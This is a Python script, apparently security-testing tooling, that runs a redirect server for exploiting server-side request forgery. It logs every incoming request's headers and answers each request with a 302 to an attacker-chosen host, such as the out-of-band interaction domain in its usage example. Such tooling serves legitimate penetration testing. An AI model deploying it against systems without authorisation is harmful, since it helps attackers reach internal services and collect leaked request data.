#!/usr/bin/env python3
"""
redirect-server.py — Cross-scheme redirect test server for SSRF chain testing.
Usage: python3 redirect-server.py <http-redirect-target-host> [port]
Example: python3 redirect-server.py xyz.oast.pro 8080

Listens on 0.0.0.0:<port> and responds to every GET with a 302 redirect
to http://<target-host>/redirected, logging all incoming request headers.
"""
import sys
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 redirect-server.py <http-redirect-target-host> [port]")
        sys.exit(1)

    target_host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    redirect_url = "http://{}/redirected".format(target_host)

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            print("\n[L1 HIT] {} {} from {}".format(
                self.command, self.path, self.client_address[0]))
            for header_name, header_val in self.headers.items():
                print("  {}: {}".format(header_name, header_val))
            print("[L1] Responding with 302 -> {}".format(redirect_url))
            self.send_response(302)
            self.send_header("Location", redirect_url)
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, fmt, *args):
            pass  # suppress default access log, using custom above

    server = HTTPServer(("0.0.0.0", port), Handler)
    local_ip = socket.gethostbyname(socket.gethostname())
    print("[*] Redirect server listening on 0.0.0.0:{}".format(port))
    print("[*] Local IP: {}:{}".format(local_ip, port))
    print("[*] Will redirect all requests to: {}".format(redirect_url))
    print("[*] Ctrl-C to stop\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopped.")

if __name__ == "__main__":
    main()
